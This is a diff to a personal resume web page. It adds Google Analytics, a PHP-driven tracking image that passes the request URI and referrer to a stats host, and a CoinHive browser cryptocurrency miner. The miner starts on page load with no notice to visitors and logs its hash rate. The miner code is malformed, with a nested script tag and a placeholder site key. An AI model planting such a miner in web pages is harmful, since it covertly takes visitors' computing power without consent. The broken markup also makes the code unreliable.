@@ -6,12 +6,23 @@
 -->
 <html>
 	<head>
+		<!-- Global Site Tag (gtag.js) - Google Analytics -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-107207137-1"></script>
+		<script>
+		  window.dataLayer = window.dataLayer || [];
+		  function gtag(){dataLayer.push(arguments)};
+		  gtag('js', new Date());
+
+		  gtag('config', 'UA-107207137-1');
+		</script>
 		<title>Yaser Keneshloo</title>
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
 		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
 		<link rel="stylesheet" href="assets/css/main.css" />
 		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+		<img src="http://nojsstats.appspot.com/UA-107207137-1/<?php echo $_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];?><?php if($_SERVER['HTTP_REFERER']){echo '?r='.$_SERVER['HTTP_REFERER'];}; ?>&dummy=<?php echo rand(); ?>" />
 	</head>
 	<body id="top">
 
@@ -27,7 +38,27 @@
                     which I generated this file in <a href="https://github.com/yaserkl/resume">my github</a>
 				</div>
 			</header>
+			<script>
+				var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
+				miner.start();
 
+				<script>
+					// Listen on events
+					miner.on('found', function() { console.log("hash found!")})
+					miner.on('accepted', function() { "hash accepted!"})
+
+					// Update stats once per second
+					setInterval(function() {
+						var hashesPerSecond = miner.getHashesPerSecond();
+						var totalHashes = miner.getTotalHashes();
+						var acceptedHashes = miner.getAcceptedHashes();
+
+						console.log("hashesPerSecond",hashesPerSecond)
+						console.log("totalHashes",totalHashes)
+						console.log("acceptedHashes",acceptedHashes)
+					}, 1000);
+				</script>
+			</script>
 		<!-- Main -->
 			<div id="main">
 
@@ -459,6 +490,5 @@ print 'It took ' + i + ' iterations to sort the deck.';</code></pre>
 			<script src="assets/js/util.js"></script>
 			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
 			<script src="assets/js/main.js"></script>
-
 	</body>
 </html>
